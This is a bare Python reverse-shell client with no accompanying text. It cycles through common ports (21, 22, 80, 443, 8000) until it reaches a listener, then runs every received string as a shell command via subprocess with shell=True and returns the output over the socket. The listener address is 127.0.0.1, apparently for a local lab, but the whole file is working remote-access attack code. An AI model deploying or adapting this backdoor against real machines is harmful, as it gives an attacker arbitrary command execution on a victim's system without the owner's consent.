import socket,time,subprocess
import codecs

def scan_and_connect():
    global mysocket
    mysocket=socket.socket()
    connected=False
    while not connected:
        for port in [21,22,80,443,8000]:
            time.sleep(1)
            try:
               print("Trying",port,end=" ")
               mysocket.connect(("127.0.0.1",port))
            except socket.error:
               print("Nope")
               continue
            else:
               print("Connected")
               connected=True
               break

scan_and_connect()
while True:
      try:
	
          command = codecs.decode(mysocket.recv(1024),"utf-8")
          
          if len(command)==0:
              time.sleep(3)
              scan_and_connect()
              mysocket=socket.socket()
              continue
          if(command[:4]=="QUIT"):
              mysocket.send(codecs.encode("Terminating Connection.\n","utf-8"))
              break
          print(command)
          p=subprocess.Popen(command ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
          results,errors = p.communicate()
          results = results+errors
          mysocket.send(results)
      except socket.error:
          break
      except Exception as e:
          mysocket.send(codecs.encode(str(e),"utf-8"))
          break
